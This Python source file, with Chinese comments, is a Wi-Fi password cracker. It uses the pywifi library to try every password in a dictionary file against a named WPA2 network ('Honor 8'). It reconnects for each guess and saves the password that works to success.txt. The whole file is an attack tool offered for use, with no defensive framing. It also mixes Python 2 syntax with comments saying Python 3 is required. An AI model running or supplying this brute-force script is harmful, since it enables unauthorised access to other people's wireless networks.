# coding:utf-8
import time  #时间
import pywifi  #破解wifi
from pywifi import const  #引用一些定义
# from asyncio.tasks import sleep
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

# *************** 需要使用 python 3 以上版本***********************
# *************** 需要使用 python 3 以上版本***********************
# *************** 需要使用 python 3 以上版本***********************

class PoJie():
    def __init__(self):
        self.passwordPath = "password.txt"# 字典路径
        self.file=open(self.passwordPath,"r")
        self.wiifNo = "Honor 8" # 需要破解的wifi账号
        self.successfile = "success.txt" #把成功账号保存在success.txt文件中
        self.errorfile = "error.txt"
        self.starttime = time.time()#开始时间
        wifi = pywifi.PyWiFi() #抓取网卡接口
        self.iface = wifi.interfaces()[0]#抓取第一个无限网卡
        self.iface.disconnect() #测试链接断开所有链接

        time.sleep(1) #休眠1秒

        #测试网卡是否属于断开状态，
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def readPassWord(self):
            print("开始破解：")
            lineNo=1
            while True:
                try:
                    myStr =self.file.readline()
                    if not myStr:
                        break
                    isOK=self.test_connect(myStr)
                    if isOK:
                        # print("密码正确："+ myStr)
                        # 密码正确写入文件中
                        endtime = time.time()
                        timeinfo = endtime-self.starttime
                        print timeinfo
                        success = "wifi:"+ self.wiifNo + "---密码:" + myStr + "---时间:" + str(timeinfo) + "---密码行:"+str(lineNo)
                        open(self.successfile, 'w').write(success)
                        print ("破解完成！")
                        break
                    else:
                        # print("密码错误:"+myStr)
                        error = "wifi:" + self.wiifNo + "---密码:" + myStr + "---密码行:" + str(lineNo)
                        open(self.errorfile, 'w').write(error)
                    time.sleep(0.5)
                    lineNo += 1
                except:
                    continue

    def test_connect(self,myStr):#测试链接

        profile = pywifi.Profile()  #创建wifi链接文件
        profile.ssid =self.wiifNo  #wifi名称
        profile.auth = const.AUTH_ALG_OPEN   #网卡的开放，
        profile.akm.append(const.AKM_TYPE_WPA2PSK) #wifi加密算法
        profile.cipher = const.CIPHER_TYPE_CCMP    #加密单元
        profile.key = myStr  #密码

        self.iface.remove_all_network_profiles() #删除所有的wifi文件
        tmp_profile = self.iface.add_network_profile(profile)#设定新的链接文件
        self.iface.connect(tmp_profile)#链接
        time.sleep(2)  #连接缓冲时间
        if self.iface.status() == const.IFACE_CONNECTED:  #判断是否连接上
            isOK=True
        else:
            isOK=False
        self.iface.disconnect() #断开
        time.sleep(1)
        #检查断开状态
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

        return isOK


    def __del__(self):
        self.file.close()

# 启动
poJie=PoJie()
poJie.readPassWord()